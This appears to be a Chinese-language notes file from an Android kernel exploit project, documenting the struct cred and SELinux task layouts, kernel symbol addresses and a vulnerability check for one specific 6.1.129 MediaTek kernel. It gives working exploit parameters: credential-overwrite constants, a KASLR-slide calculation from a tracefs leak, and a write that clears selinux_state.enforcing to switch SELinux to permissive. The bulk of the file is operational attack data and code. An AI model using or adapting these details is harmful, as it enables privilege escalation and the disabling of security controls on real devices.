# 本内核 BTF 实测结构布局

由仓库内 `dumpbtf` 工具直接从 `boot.img` 的 `.BTF` 段读出，非推测。

内核：`6.1.129-android14-11-g6b7a9f51c088-ab13432504`（MT6878）

```bash
dumpbtf boot.img cred task_security_struct
```

---

## `struct cred` — size 0xb0 (176)

| 偏移 | 大小 | 字段 |
|---|---|---|
| `+0x000` | 4 | `usage` *(atomic_t — 注意：6.12 是 atomic_long_t / 8 字节)* |
| `+0x004` | 4 | `uid` |
| `+0x008` | 4 | `gid` |
| `+0x00c` | 4 | `suid` |
| `+0x010` | 4 | `sgid` |
| `+0x014` | 4 | `euid` |
| `+0x018` | 4 | `egid` |
| `+0x01c` | 4 | `fsuid` |
| `+0x020` | 4 | `fsgid` |
| `+0x024` | 4 | `securebits` |
| `+0x028` | 8 | `cap_inheritable` |
| `+0x030` | 8 | `cap_permitted` |
| `+0x038` | 8 | `cap_effective` |
| `+0x040` | 8 | `cap_bset` |
| `+0x048` | 8 | `cap_ambient` |
| `+0x050` | 1 | `jit_keyring` |
| `+0x058` | 8 | `session_keyring` |
| `+0x060` | 8 | `process_keyring` |
| `+0x068` | 8 | `thread_keyring` |
| `+0x070` | 8 | `request_key_auth` |
| **`+0x078`** | 8 | **`security`** ← SELinux blob 指针 |
| **`+0x080`** | 8 | **`user`** (struct user_struct) |
| **`+0x088`** | 8 | **`user_ns`** |
| **`+0x090`** | 8 | **`ucounts`** |
| **`+0x098`** | 8 | **`group_info`** |

**与 6.12 的差异**：全部字段 **-8 字节**（因为 `usage` 是 4 字节而非 8 字节）。

---

## `struct task_security_struct` — size 0x18 (24)

| 偏移 | 大小 | 字段 |
|---|---|---|
| `+0x00` | 4 | `osid` |
| `+0x04` | 4 | **`sid`** ← 当前 SID，**必须填有效值** |
| `+0x08` | 4 | `exec_sid` |
| `+0x0c` | 4 | `create_sid` |
| `+0x10` | 4 | `keycreate_sid` |
| `+0x14` | 4 | `sockcreate_sid` |

`SELINUX_SID_KERNEL = 1`。

> 上游只写 `+0x08` / `+0x0c`，把 `sid` 留在 0（无效 SID）。
> 本仓库改为 6 个字段全部填 1。

---

## 提权用到的其它常量

| 名称 | 值 | 来源 |
|---|---|---|
| `OFF_TASK_CRED` | `0x838` | BTF `task_struct.cred` |
| `CRED_UID_OFF` | `4` | BTF `cred.uid` |
| `CRED_REQ` | `0xb0` | `sizeof(struct cred)` |
| `CRED_ALLOC` | `0xc0` | slab 实际块大小 |
| `TIMER_ALLOC` | `0x108` | posix_timers_cache 块大小 |
| `TASK_ALLOC_BYTES` | `0x12c0` | task_struct 分配大小 |

---

## 本机 profile（`source/kbuilds/6.1.129-*.h`）

```c
{
    "6.1.129-android14-11-g6b7a9f51c088-ab13432504",
    0xffffffc008192208ULL,  /* static_timer_site        */
    0x192208ULL,            /* timer_site_low21         */
    0xabe80ULL,             /* copy_process_low21       */
    0xffffffc00a2283d0ULL,  /* selinux_state            */
    0xffffffc009fdae08ULL,  /* panic_on_warn            */
    0xffffffc00a000740ULL,  /* root_user                */
    0xffffffc00a0004b0ULL,  /* init_user_ns             */
    0xffffffc00a001fc8ULL,  /* init_ucounts             */
    0xffffffc00a001a60ULL,  /* init_groups              */
    0x838ULL, 0xb0ULL, 0xc0ULL, 0x108ULL, 0x12c0ULL, 4U,
}
```

### 本机漏洞判定

```
release    6.1.129-android14-11-g6b7a9f51c088-ab13432504
vulnerable YES
  begin_new_exec: unshare_files, set_mm_exe_file run before posix_cpu_timers_exit
  posix_cpu_timer_del: pid_task()==NULL at +0x194640,
                       timerqueue_del not called (stale node left in the timerqueue)
profile    created, registered
```

---

## KASLR slide

运行时 slide 由 tracefs 泄漏的 call site 推导：

```
g_slide = site0 - STATIC_TIMER_SITE
```

本机实测 `site0 = 0xffffffee87592208`，low21 校验 `0x192208` 通过，
`slide = 0x2e7f400000`（该 BSP 内核的 KASLR 位移可以很大，属正常）。

因此所有静态符号地址必须加 `g_slide`：

```c
#define SELINUX_STATE_STATIC  (g_kbuild->selinux_state)
...
stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0, "selinux", raw, NULL);
```

`-7` 是刻意的：单次写是 8 字节，对齐到 `[base-7, base]` 正好把
`selinux_state.enforcing`（offset 0，`bool`，`CONFIG_SECURITY_SELINUX_DEVELOP=y`
且 `CONFIG_SECURITY_SELINUX_DISABLE` 未启用）清零 → Permissive。

已验证本机内核配置：

```
CONFIG_SECURITY_SELINUX=y
CONFIG_SECURITY_SELINUX_DEVELOP=y
# CONFIG_SECURITY_SELINUX_DISABLE is not set
```
